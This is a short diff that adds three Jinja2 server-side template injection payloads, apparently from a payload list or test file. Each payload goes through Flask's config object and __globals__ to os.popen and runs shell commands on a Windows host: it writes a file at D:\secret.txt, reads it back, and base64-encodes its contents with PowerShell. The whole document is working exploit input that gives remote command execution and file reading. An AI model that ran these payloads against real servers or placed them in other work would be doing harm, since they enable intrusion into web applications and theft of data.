@@ -1,0 +1,3 @@
+{{config.__class__.__init__.__globals__['os'].popen("echo 123:123 > D:\\secret.txt").read()}}
+{{config.__class__.__init__.__globals__['os'].popen("type D:\\secret.txt").read()}}
+{{config.__class__.__init__.__globals__['os'].popen("powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('D:\\secret.txt'))\"").read()}}
